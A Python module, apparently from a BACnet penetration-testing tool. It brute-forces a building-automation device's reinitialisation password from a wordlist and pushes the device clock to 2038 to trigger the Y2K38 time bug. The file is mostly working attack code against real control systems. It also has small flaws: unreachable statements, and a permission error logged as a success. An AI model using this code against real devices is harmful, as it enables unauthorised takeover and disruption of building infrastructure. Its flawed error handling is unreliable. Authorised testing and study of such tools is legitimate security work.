from inputs import Password_char
from bacnet.service import BACnetService
from bacnet.object import BACnetObject
from itertools import islice
from bacnet.datalink import *
from modules.actions import set_time
from utils import *

import socket
import sys




def time_wraparound(dl: BACnet_Data_Link):
    """
    Simulates a time wraparound to a date that is near the year 2038 (to test Y2K38 bug).
    """
    set_time(dl, "20.01.2038.3", "12:00:00:00")


def send_credentials(dl: BACnet_Data_Link, password : str):   
    """
    Sends the given password to the BACnet device to attempt authentication.

    Parameters:
        dl (BACnet_Data_Link): The BACnet data link instance.
        password (str): The password to send.

    Returns:
        response (bytes): The response from the BACnet device.
    """ 
    password_char = (len(password)+1).to_bytes(1,'little')+ b'\x00' + password.encode()
    reinit = BACnetService(0,20, [
        BACnetObject(0,1,1, b'\x00'),
        BACnetObject(1,1,5, password_char)
        ])

    return remove_bvlc_npdu_header(dl.send_and_get(reinit))


def bruteforce(dl, pwd_list_file : str, start_index = 0):
    """Attempts to brute force the password using a list of passwords from the given file.

    Parameters:
        dl (BACnet_Data_Link): The BACnet data link instance.
        pwd_list_file (str): The file containing the list of passwords to try.
        start_index (int): The index to start the brute force from (useful for resuming).
    
    Returns:
        None
    """
    
    #Optimization for websocket
    if isinstance(dl, BACnet_SC): return dl.bruteforce(pwd_list_file, start_index)
    try :
        with open(pwd_list_file,"r") as pwd_list:
            for i, pwd in enumerate(islice(pwd_list, start_index , None), start=start_index):
                pwd=pwd[:-1]
                if(len(pwd)<4): continue
                sys.stdout.write(" " * 50)
                sys.stdout.write("\r")
                sys.stdout.write(f"\t{Fore.CYAN}Testing: {pwd.strip()}\r{Style.RESET_ALL}")  # Write to stdout, overwrite previous line
                sys.stdout.flush()
                resp = send_credentials(dl, pwd)
                
                if resp is None:
                    fail(f"\n\tConnection Failed for password : {pwd} index : {i} ")
                    continue
                if resp[0] == 0x60:
                    fail(f"Non security Error [{reject_reason[resp[2]]}] received for password : {pwd} index : {i}")
                    continue
                if resp[0] ==0x50:
                    if resp[4] == 0x04: 
                        continue
                    fail(f"\n\tNon security Error received for password : {pwd} index : {i}")
                    continue

                    fail(f"\n\tNon security Error received for password : {pwd} index : {i}")
                    return
                success(f"\n\tPassword found : {pwd} index : {i}")
                return
    except FileNotFoundError:
        fail(f"Error: The file '{pwd_list_file}' was not found.")
    except PermissionError:
        success(f"Error: Permission denied while trying to open '{pwd_list_file}'.")
